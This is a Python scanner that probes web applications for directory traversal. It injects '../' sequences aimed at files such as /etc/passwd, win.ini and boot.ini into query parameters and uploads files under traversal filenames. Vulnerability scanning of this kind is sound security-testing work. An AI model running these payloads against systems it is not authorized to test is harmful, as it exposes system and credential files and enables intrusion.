import argparse
import logging
import requests
import os
import sys
import posixpath
import urllib.parse

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Each target file carries markers from its own real content, so every
# payload in the set can actually fire.
FILE_MARKERS = {
    "etc/passwd": ["root:"],
    "win.ini": ["; for 16-bit app support", "[fonts]"],
    "boot.ini": ["[boot loader]"],
}

def setup_argparse():
    """
    Sets up the argument parser for the command-line interface.
    """
    parser = argparse.ArgumentParser(description="Detects directory traversal vulnerabilities in web applications.")
    parser.add_argument("url", help="The URL to scan.")
    parser.add_argument("-p", "--parameter", help="The parameter to fuzz (optional). If not provided, all GET parameters are fuzzed.", default=None)
    parser.add_argument("-f", "--file_upload", help="Path to a file to upload for file upload vulnerability testing (optional).", default=None)
    parser.add_argument("-d", "--depth", type=int, help="Traversal depth (default: 3).", default=3)
    parser.add_argument("-o", "--output", help="Output file to save results (optional).", default=None)
    return parser.parse_args()

def build_test_url(url, param_name, payload):
    """
    Builds a test URL by parsing the query and replacing only the named
    parameter's value. The rest of the URL, host, port, path, and other
    parameters, is never rewritten, whatever the original value was.
    """
    parsed = urllib.parse.urlparse(url)
    # parse_qsl plus urlencode below rebuilds the whole query, so the other
    # parameters come back re-encoded. Their values survive; their exact
    # original spelling, like a plus for a space, may not.
    pairs = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new_pairs = [(k, payload if k == param_name else v) for k, v in pairs]
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(new_pairs)))

def test_directory_traversal(url, parameter=None, depth=3):
    """
    Tests a URL for directory traversal vulnerabilities.

    Returns:
        tuple: (vulnerable_urls, requests_sent, requests_failed, fatal_reason)
        fatal_reason is a string when no honest verdict can be given at all
        (no parameters, or the named parameter is absent).
    """

    vulnerable_urls = []
    sent = 0
    failed = 0
    traversal_sequences = ["../" * i for i in range(1, depth + 1)]

    parsed_url = urllib.parse.urlparse(url)
    # parse_qs drops blank values by default, so a parameter written as
    # ?page= with nothing after the equals is invisible here. It counts as
    # no parameter, and naming it with -p reports it as not found.
    query_params = urllib.parse.parse_qs(parsed_url.query)

    if not query_params:
        return vulnerable_urls, 0, 0, "the URL has no query parameters to test"

    if parameter:
        if parameter not in query_params:
            return vulnerable_urls, 0, 0, f"parameter '{parameter}' not found in URL"
        param_names = [parameter]
    else:
        param_names = list(query_params)

    for param_name in param_names:
        for sequence in traversal_sequences:
            for filename, markers in FILE_MARKERS.items():
                modified_url = build_test_url(url, param_name, sequence + filename)
                sent += 1
                try:
                    # No raise_for_status: an error status body can still
                    # carry the marker, and it is checked like any other.
                    response = requests.get(modified_url, timeout=5)
                    if any(marker in response.text for marker in markers):
                        logging.info(f"Potential directory traversal vulnerability found: {modified_url} (status {response.status_code})")
                        vulnerable_urls.append(modified_url)
                except requests.exceptions.RequestException as e:
                    failed += 1
                    logging.error(f"Error during request to {modified_url}: {e}")
                except Exception as e:
                    failed += 1
                    logging.error(f"An unexpected error occurred: {e}")

    return vulnerable_urls, sent, failed, None


def test_file_upload_traversal(url, file_path, depth=3):
    """
    Tests a file upload endpoint for directory traversal vulnerabilities.

    A bare status code is not evidence. A positive needs the server to have
    created the file (a 201) or the uploaded content to be retrievable at
    the escaped path the traversal filename points to.

    Returns:
        tuple: (vulnerable, attempts_sent, attempts_failed)
    """

    if not os.path.exists(file_path):
        logging.error(f"File not found: {file_path}")
        return False, 0, 0

    with open(file_path, "rb") as fh:
        payload_bytes = fh.read()
    try:
        payload_text = payload_bytes.decode("utf-8")
    except UnicodeDecodeError:
        # A binary upload can still pass on a 201 below, but the read back
        # check needs text to search for, so a binary file gets only half
        # of the two proofs this function can offer.
        payload_text = None

    traversal_sequences = ["../" * i for i in range(1, depth + 1)]
    filename = os.path.basename(file_path)
    parsed = urllib.parse.urlparse(url)
    # posixpath, not os.path, on purpose: this path lives in a URL, so it
    # uses forward slashes no matter what system I run the scanner on.
    upload_dir = posixpath.dirname(parsed.path)

    sent = 0
    failed = 0
    for sequence in traversal_sequences:
        modified_filename = sequence + filename
        files = {'file': (modified_filename, payload_bytes)}
        sent += 1
        try:
            response = requests.post(url, files=files, timeout=10)

            if response.status_code == 201:
                logging.info(f"Upload created a file for traversal filename: {modified_filename} (status 201)")
                return True, sent, failed

            # Follow up: can the content be read back at the escaped path?
            escaped_path = posixpath.normpath(posixpath.join(upload_dir, sequence + filename))
            check_url = urllib.parse.urlunparse(parsed._replace(path=escaped_path, query=""))
            try:
                check = requests.get(check_url, timeout=10)
                if check.status_code == 200 and payload_text and payload_text in check.text:
                    logging.info(f"Uploaded content retrievable at escaped path: {check_url}")
                    return True, sent, failed
            except requests.exceptions.RequestException:
                pass

        except requests.exceptions.RequestException as e:
            failed += 1
            logging.error(f"Error uploading file: {e}")
        except Exception as e:
            failed += 1
            logging.error(f"An unexpected error occurred: {e}")

    return False, sent, failed


def save_lines(path, lines):
    try:
        with open(path, "w") as f:
            for line in lines:
                f.write(line + "\n")
        logging.info(f"Results saved to {path}")
        return True
    except IOError as e:
        logging.error(f"Error writing to file: {e}")
        return False


def main():
    """
    Main function to execute the vulnerability scanner.
    """
    args = setup_argparse()

    # Validate URL
    result = urllib.parse.urlparse(args.url)
    if not all([result.scheme, result.netloc]):
        logging.error("Invalid URL: a full URL with scheme and host is required.")
        sys.exit(1)

    # Validate file upload path (if provided)
    if args.file_upload and not os.path.isfile(args.file_upload):
        logging.error("Invalid file upload path.")
        sys.exit(1)

    if args.file_upload:
        vulnerable, sent, failed = test_file_upload_traversal(args.url, args.file_upload, args.depth)
        if sent == 0 or failed == sent:
            logging.error("Upload test did not complete: no upload reached the target. No verdict is reported.")
            sys.exit(1)
        if vulnerable:
            logging.info("File upload traversal vulnerability detected.")
            if args.output:
                save_lines(args.output, [f"File upload traversal vulnerability detected at {args.url}"])
        else:
            logging.info("No file upload traversal vulnerability detected.")
            if args.output:
                save_lines(args.output, [f"No file upload traversal vulnerability detected at {args.url}"])
        return

    vulnerable_urls, sent, failed, fatal = test_directory_traversal(args.url, args.parameter, args.depth)

    if fatal:
        logging.error(f"Scan did not run: {fatal}. No verdict is reported.")
        sys.exit(1)
    if sent == 0 or failed == sent:
        logging.error("Scan did not complete: every request failed. No verdict is reported.")
        sys.exit(1)

    if vulnerable_urls:
        logging.info("Vulnerable URLs found:")
        for url in vulnerable_urls:
            logging.info(url)
        if args.output:
            save_lines(args.output, vulnerable_urls)
    else:
        logging.info("No directory traversal vulnerabilities found.")


if __name__ == "__main__":
    main()

# Usage Examples:
# 1. Scan a URL:
#    python main.py "http://example.com/index.php?page=test.txt"
#
# 2. Scan a URL with a specific parameter to fuzz:
#    python main.py "http://example.com/index.php?page=test.txt&id=123" -p page
#
# 3. Scan a URL and save the vulnerable URLs to a file:
#    python main.py "http://example.com/index.php?page=test.txt" -o results.txt
#
# 4. Scan for file upload traversal vulnerability:
#    python main.py "http://example.com/upload.php" -f test.txt
